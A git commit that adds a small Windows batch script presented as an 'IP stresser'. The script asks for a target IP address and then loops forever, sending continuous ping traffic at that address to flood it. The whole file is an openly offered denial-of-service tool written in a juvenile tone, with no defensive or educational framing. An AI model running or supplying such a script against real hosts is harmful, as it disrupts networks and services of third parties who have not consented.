46d5b2a509dbc586bd76abf938e0b35206f7339c
hayiaku666 <78820827+Hayiaku@users.noreply.github.com>
2021-02-15 14:17:51 +0100

    Add files via upload

---
+++ hayiakus STRESSER.bat
@@ -0,0 +1,16 @@
+echo off 
+cls
+color a
+title SKIDDS-IP-STRESSER [Made By Hayiaku]
+echo [==============================]
+echo [Are You Ready To Send Sum Nois Sauces?]
+echo [==============================]
+set /p a=[Happy bois IP:
+echo [Boi on the menu]
+set /p b=[How many SAUCES:
+cls
+:sauces foundedo!
+color d
+echo  sendin em lolissss %a%
+ping %a% -i %b% -t >nul
+goto :sauces foundedo!
